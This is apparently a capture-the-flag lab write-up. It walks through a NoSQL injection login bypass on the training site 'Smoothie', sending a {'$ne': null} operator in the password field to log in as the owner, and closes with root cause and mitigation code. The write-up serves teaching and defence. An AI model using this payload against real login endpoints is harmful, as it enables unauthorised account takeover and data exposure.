---
title: "NoSQL Injection Leads to Authentication Bypass | Smoothie"
date: 2026-06-19 15:45:00 +0530
categories: [A05 - Injection, NoSQL Injection]
tags: [nosql-injection, authentication-bypass, mongodb, express, webverselabs-pro, smoothie]
platform: WebVerse Pro
author: Shivansh Sharma
image:
  path: /assets/images/posts/smoothie-nosqli.webp
  alt: Smoothie NoSQL Injection Authentication Bypass
---

## Lab Link

[WebVerse Pro — Smoothie](https://dashboard.webverselabs-pro.com/foundational-labs/smoothie)

---

## Overview

Smoothie is a WebVerse Pro foundational lab based on a small online-ordering site for **Citrine Juice Co.** The application provides normal authentication features such as signup, login, and an account page.

The lab hint pointed toward an old login form that had not been revisited since the owner built the site. This led to testing the authentication API for injection issues.

The vulnerability was a **NoSQL Injection authentication bypass** in the login endpoint. The backend accepted a JSON object in the `password` field and passed it into the database query without enforcing that the password value was a string.

## Objective

The objective was to access the owner account and retrieve the flag from the private staff notes area.

## Vulnerability Identification

After creating a normal customer account, the signup endpoint returned a valid signed session cookie:

```http
POST /api/auth/signup HTTP/1.1
Host: <TARGET_HOST>
Content-Type: application/json

{
  "name": "kelvin",
  "email": "kelvin@kel.com",
  "password": "kelvinpass"
}
```

The response confirmed account creation:

```http
HTTP/1.1 200 OK
Set-Cookie: citrine_sid=<REDACTED>
Set-Cookie: citrine_sid.sig=<REDACTED>

{"ok":true}
```

Visiting `/account` showed a normal customer profile:

```html
<div class="account-name">kelvin</div>
<span class="account-role">customer</span>
```

Because the briefing focused on the login form, the next step was to inspect `/api/auth/login`.

## Recon / Approach

A normal login request used JSON:

```http
POST /api/auth/login HTTP/1.1
Host: <TARGET_HOST>
Content-Type: application/json

{
  "email": "kelvin@kel.com",
  "password": "kelvinpass"
}
```

Since the backend was Express-based and accepted JSON, I tested whether the password field could be changed from a string into a MongoDB-style operator object.

The first useful test was:

```http
POST /api/auth/login HTTP/1.1
Host: <TARGET_HOST>
Content-Type: application/json

{
  "email": "kelvin@kel.com",
  "password": {
    "$ne": null
  }
}
```

This returned `200 OK`, proving that the application accepted NoSQL query operators inside the password field:

```http
HTTP/1.1 200 OK
Set-Cookie: citrine_sid=<REDACTED>
Set-Cookie: citrine_sid.sig=<REDACTED>

{
  "ok": true,
  "user": {
    "name": "kelvin",
    "email": "kelvin@kel.com"
  }
}
```

At this point, the issue was confirmed: the login query was vulnerable to NoSQL Injection.

## Finding the Owner Email

The public contact page disclosed the owner email address:

```http
GET /contact HTTP/1.1
Host: <TARGET_HOST>
```

The response contained:

```html
<div class="section-eyebrow">Email</div>
<p>margot@citrinejuice.example</p>
```

This gave a valid target account for the authentication bypass.

## Exploitation

Using the disclosed owner email, I sent the same NoSQL Injection payload in the password field:

```http
POST /api/auth/login HTTP/1.1
Host: <TARGET_HOST>
Content-Type: application/json

{
  "email": "margot@citrinejuice.example",
  "password": {
    "$ne": null
  }
}
```

The response confirmed a successful login as the owner:

```http
HTTP/1.1 200 OK
Set-Cookie: citrine_sid=<REDACTED>
Set-Cookie: citrine_sid.sig=<REDACTED>

{
  "ok": true,
  "user": {
    "name": "Margot Calloway",
    "email": "margot@citrinejuice.example"
  }
}
```

The new session cookie was then used to access the account page:

```http
GET /account HTTP/1.1
Host: <TARGET_HOST>
Cookie: citrine_sid=<REDACTED>; citrine_sid.sig=<REDACTED>
```

The account page now showed the owner profile:

```html
<div class="account-name">Margot Calloway</div>
<span class="account-role">owner</span>
```

## Proof / Flag

The owner account displayed a private staff notes section:

```html
<div class="notes-card">
  <h2>Staff notes</h2>
  <div class="note-body">WEBVERSE{...}</div>
</div>
```

The flag was visible inside the owner-only staff notes.

```text
WEBVERSE{REDACTED}
```

## Root Cause

The root cause was improper handling of JSON input in the login endpoint.

The application likely performed a database lookup using user-controlled values similar to:

```js
db.users.findOne({
  email: req.body.email,
  password: req.body.password
})
```

Because `req.body.password` was not validated as a string, an attacker could supply a MongoDB operator object:

```json
{
  "$ne": null
}
```

This transformed the password comparison into a condition meaning:

```text
password is not null
```

As a result, the database matched the owner account without requiring the real password.

## Impact

This vulnerability allowed an attacker to:

- bypass authentication without knowing the victim's password;
- log in as the site owner;
- access owner-only account data;
- read private staff notes containing the lab flag.

In a real application, this could lead to full account takeover and exposure of sensitive internal data.

## Mitigation

To prevent this issue:

- enforce strict schema validation on all authentication inputs;
- reject non-string values for `email` and `password`;
- avoid passing raw request bodies directly into database queries;
- use safe query builders or parameterized lookup patterns;
- hash passwords and compare them with a dedicated password verification function;
- disable MongoDB operator interpretation from untrusted JSON input where possible;
- add authentication logging and alerting for unusual login payloads.

A safer login pattern would be:

```js
if (typeof email !== "string" || typeof password !== "string") {
  return res.status(400).json({ error: "Invalid input" });
}

const user = await users.findOne({ email });

if (!user) {
  return res.status(401).json({ error: "Invalid credentials" });
}

const valid = await bcrypt.compare(password, user.passwordHash);

if (!valid) {
  return res.status(401).json({ error: "Invalid credentials" });
}
```

## Lessons Learned

This lab demonstrated that authentication bypass is not limited to classic SQL Injection. JSON-based APIs can also be vulnerable when user-controlled objects are passed directly into NoSQL queries.

The key lesson is that input validation must verify both the **value** and the **type** of user input. A login form expecting a password string should never accept an object such as `{ "$ne": null }`.
